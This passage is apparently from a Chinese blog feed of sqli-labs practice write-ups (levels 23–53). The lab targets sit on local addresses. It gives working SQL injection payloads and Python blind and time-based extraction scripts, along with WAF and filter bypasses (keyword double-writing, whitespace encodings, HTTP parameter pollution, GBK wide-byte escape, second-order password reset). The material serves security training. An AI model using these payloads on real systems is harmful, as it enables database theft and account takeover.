class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-46/?sort=rand(updatexml(1,concat(0x7e,database(),0x7e),1))</span><br></pre></td></tr></table></figure><p>也可以用盲注，利用表格最后一行去区分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-46/?sort=rand(ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125;)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Min+Max)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;td&gt;superman&lt;/td&gt;&lt;td&gt;genious&lt;/td&gt;&lt;/tr&gt;&lt;/font&gt;&lt;/table&gt;'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>这一次的order by注入需要闭合单引号<br>来个报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-47/?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>跟46题一样的盲注。</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>一直在尝试下面这两句话，发现一直没效果，奇了怪，自我感觉没问题。。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and rand(ascii(substr((select database()),1,1))&gt;127)%23</span><br><span class="line">http://localhost/sql/Less-49/?sort=1&apos; and ascii(substr((select database()),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>再来尝试一下时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.105/sqlilabs/Less-49/?sort=1' and if(((ascii(substr((select password from users where username="admin"),&#123;_&#125;,1)))=&#123;__&#125;),sleep(4),false) --+'''</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">67</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>直接出来结果，这尼玛什么操作。。</p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>这可以直接报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-50?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>单引号闭合报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-51?sort=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>同样直接盲注或者时间盲注都行，不需要单引号闭合没什么意义</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>又是一道单引号闭合的题目，直接时间盲注就可以出来参考Less-49的脚本</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这一部分的题目让我了解到怎么对付order by注入，很有意义，个人最喜欢还是用rand函数的那种办法<br>但前面的堆叠注入就感觉意义不大。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-38&quot;&gt;&lt;a href=&quot;#Less-38&quot; class=&quot;headerlink&quot; title=&quot;Less-38&quot;&gt;&lt;/a&gt;Less-38&lt;/h3&gt;&lt;p&gt;从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(二)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-2/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-2/</id>
    <published>2018-08-29T12:01:26.000Z</published>
    <updated>2018-08-29T12:15:57.643Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了<a id="more"></a><br>这一题查看源代码的话发现注释符被过滤掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>但其实对于这一句SQL语句，我们可以直接单引号闭合而不用注释去把后面的东西给省略掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-23/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>直接报出数据库，此题完结</p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这一题应该是设计二次注入的题目<br>在CTF题目里面的话肯定是要你获取admin的账号然后改变admin的密码用admin账号登录获取flag<br>这里主要关键是pass_change.php这里面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span></span><br></pre></td></tr></table></figure><p>若我们在修改密码的时候<br>注册一个<code>admin’#</code>的用户就是为了后期能够使这一句话后面的内容全都注释的，从而直接更新的是<code>admin</code>的用户名<br>这时候的语句就会变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">'$pass'</span> where username=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure><p>改你想要密码，然后退出在直接用admin登录就好</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>这一题看源代码会发现有一个黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把or还有AND都会替换成为<code>&quot;&quot;</code>，这里是大小写都会被拦截下来的<br>这时候其实可以有几个办法能够绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）大小写变形Or,OR,oR</span><br><span class="line">（2）编码，hex，urlencode</span><br><span class="line">（3）添加注释/*or*/</span><br><span class="line">（4）利用符号and=&amp;&amp; or=||</span><br><span class="line">（5）双写绕过</span><br></pre></td></tr></table></figure><p>输入一个单引号会出现单引号的报错，所以我们尝试闭合一下<br><code>http://127.0.0.1/sqlilabs/Less-25/?id=1%27 %23</code> 成功出现回显 </p><p>我这里选择用双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; aandnd updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>符号绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; || updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>跟上面一题同样的过滤方式，语句变简单了，不用单引号去闭合<br>但是这一题不能再用报错注入，因为源码中把报错信息给注释掉了，可以用盲注，我们需要用的是union注入或者是盲注<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>再来一个二分法盲注，通过注入成功还会显示登录名这个标志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-25a/?id=1 aandnd ascii(substr(database(),&#123;_&#125;,1))&gt;&#123;__&#125;%23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p>注意 上面这两关在写到关于information这个单词的时候，需要注意它里面存在or，我们需要双写绕过</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>输入?id=’会出现单引号的报错<br>但是想用注释符去闭合发现没效果，再用<code>?id=1&#39; or &#39;1&#39;=&#39;1</code>去尝试发现回显成功，这有可能就是注释符被过滤了<br>看看源代码，果然黑名单被过滤了，空格也被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没关系，这样我们也可以使用报错注入，这里空格要想绕过的话不能够用注释了，我们可以用<code>%a0</code>，但是我们也可以用无空格报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&apos; ||updatexml(1,concat(0x7e,database(),0x7e),1)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>用%a0也可以注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-26/?id=1&apos;%a0anandd%a0updatexml(1,concat(0x7e,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.TABLES</span><br><span class="line">%a0where%a0TABLE_SCHEMA=database()),0x7e),1)%a0anandd%0a&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>此处我们需要说明两方面：对于<code>注释</code>和结尾字符的我们此处只能利用<br>构造一个<code>’</code> 来闭合后面到<code>’</code> ；<br>对于空格，有较多的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure></p><p>注意上面的编码绕不过的话我们可以用Linux环境测试</p><p>Less-26a<br>只是查询的句子变了，多了一个括号，这一题也不能报错<br>我们可以用盲注<br><a href="http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr</a>(‘1’=’1</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>这里发现源代码里面的黑名单又壮大了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们任然可以用双写绕过，也可以用大小写绕过，但是我们直接报错注入就行了不用麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-27/?id=1&apos;and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>这一题就是源代码把报错注入的回显给注释掉<br>那我们用盲注就好<br>双引号闭合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-27a/?id=1"and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;"&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>这一题把<code>union select</code>无论大小写都过滤掉了，把上面那几题能够双写绕过的全都封杀掉了<br>这一题只能够盲注，不能报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-28/?id=1')and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;('&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>这一题跟上面一题区别不大，也是用盲注，也可以用<code>union注入</code>，只是不要出现+号就好<br>忙著自己闭合单引号和括号就行<br>这里我用的是union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-28a/?id=-1%27)unIon(SeLect%201,database(),%273</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>这一题好像是涉及到二层服务的问题，里面的有一个叫HPP(http参数污染)攻击<br>但是没关系就是第一个参数通过了第一层服务器的waf过滤结果第二个参数没有过滤，这是因为apache的特性，只获取最后一个参数<br>这里我们是可以直接用单引号闭合就ok</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-29/?id=1&amp;id=-1%27%20union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>同上面的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br></pre></td></tr></table></figure><p>就是先利用了这个Tomcat去做waf过滤，其实对第二个参数不起作用<br>这次直接闭合双引号就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-30/?id=1&amp;id=-1&quot; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>Less-31<br>这一题就是SQL查询语句变了一下，我们需要闭合双引号和括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-31/?id=1&amp;id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>这一题我一开始没有头绪，因为所有参数都被转义了，不能够闭合，后来发现是另外的绕过方法，原来是宽字节的问题<br>原理：mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如<code>%aa%5c</code> 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤<code>’</code> 的时候，往往利用的思路是将<code>‘</code> 转换为<code>\’</code><br>因此我们在此想办法将‘ 前面添加的\ 除掉，一般有两种思路：</p><ol><li><code>%df</code> 吃掉<code>\</code> 具体的原因是urlencode(\‘) = <code>%5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的mysql 在GBK 编码方式的时候会将两个字节当做一个汉字，此事<code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</li><li>将<code>\’</code> 中的<code>\</code> 过滤掉，例如可以构造<code>%**%5c%5c%27</code> 的情况，后面的%5c 会被前面的<code>%5c</code>给注释掉。这也是bypass 的一种方法。</li></ol><p>看源代码我们利用单引号闭合然后加上%df就好，这里我们可以用union注入也可以用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-32/?id=-1%df%27union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>这个同上面那题一模一样直接闭合单引号就好，是就是上面写的check函数应该是作者自己写的，这一题是直接调用了系统的函数<br>对比一下两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span 